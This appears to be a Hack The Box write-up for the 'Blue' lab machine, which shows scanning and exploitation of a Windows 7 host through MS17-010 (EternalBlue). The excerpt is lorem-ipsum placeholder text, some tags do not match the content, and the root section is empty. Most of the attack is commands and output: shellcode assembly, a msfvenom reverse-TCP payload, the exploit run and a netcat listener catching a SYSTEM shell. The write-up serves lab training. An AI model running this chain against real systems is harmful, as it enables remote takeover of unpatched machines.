---
layout: single
title: Blue - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-04-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-blue/blue_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-blue/blue_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/blue]# nmap -Pn -n -sCV 10.10.10.40 --open                                                                         (master✱)
    Not shown: 991 closed ports
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 3m40s, deviation: 1s, median: 3m39s
    | smb-os-discovery:
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: haris-PC
    |   NetBIOS computer name: HARIS-PC\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2021-02-24T13:00:40+00:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2021-02-24T13:00:38
    |_  start_date: 2021-02-24T12:54:58


  [root:/git/htb/blue]# nmap -p139,445 --script vuln 10.10.10.40                                                                    (master✱)
    Host script results:
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143


2. Just like the box 'legacy' this device is vulnerable to ms17-010, eternal blue (as suggested by the box name).
   Trying to execute the same exploit and payload however gives us an error, so we need to find another approach.

     [root:/git/htb/blue]# python send_and_execute.py 10.10.10.40 ms17-010.exe                                                         (master✱)
      Trying to connect to 10.10.10.40:445
      Target OS: Windows 7 Professional 7601 Service Pack 1
      Not found accessible named pipe
      Done


3. Assemble the shellcode to binary, here we need to know the architecture (x64 or x86) but Im assuming it's x64 so lets start with that.

    [root:/git/htb/blue]# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin

    Generate binary payload:
    [root:/git/htb/blue]# msfvenom -p windows/x64/shell_reverse_tcp LPORT=4488 LHOST=10.10.14.10 --platform windows -a x64 --format raw -o sc_x64_payload.bin
      No encoder specified, outputting raw payload
      Payload size: 460 bytes
      Saved as: sc_x64_payload.bin

    Concentrate payload & shellcode:
    [root:/git/htb/blue]# cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin


4. Exploit and grab all the flags.

    [root:/git/htb/blue]# python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin                                                       (master✱)
      shellcode size: 1232
      numGroomConn: 13
      Target OS: Windows 7 Professional 7601 Service Pack 1
      SMB1 session setup allocate nonpaged pool success
      SMB1 session setup allocate nonpaged pool success
      good response status: INVALID_PARAMETER
      done


    [root:/git/htb/blue]# nc -lvnp 4488                                                                                               (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.40] 49158
      Microsoft Windows [Version 6.1.7601]
      Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

      C:\Windows\system32>whoami
        nt authority\system

      C:\Users\haris\Desktop>type user.txt
        4c546aea7dbee75cbd71de245c8deea9

      C:\Users\Administrator\Desktop>type root.txt
        ff548eb71e920ff6c08843ce9df4e717


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

ms17-010 EternalBlue manual exploit:
  https://root4loot.com/post/eternalblue_manual_exploit/

ms17-010 shellcode:
  https://github.com/worawit/MS17-010/tree/master/shellcode
